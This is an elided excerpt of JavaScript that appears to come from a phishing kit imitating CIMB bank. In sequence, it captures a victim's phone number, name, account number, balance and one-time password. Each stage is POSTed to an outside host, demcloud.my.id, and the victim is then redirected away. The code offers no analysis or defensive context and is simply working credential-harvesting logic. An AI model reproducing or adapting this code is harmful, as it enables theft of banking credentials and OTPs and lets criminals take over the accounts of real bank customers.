...
function sendNohp(){    
  ...
  sessionStorage.setItem('nomor', nomor);                     
       ...
       $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/cimbtarif/no.php',
...
function sendLogin(){
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
     ...
     $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/cimbtarif/login.php',
...
function sendSaldo(){
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo) {      
       ...
       $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/cimbtarif/saldo.php',
...
function sendOtp(){
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
     ...
     $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/cimb/cimbtarif/otp.php',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/cimb/cimbtarif/wa';
    }, 00);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 00);      
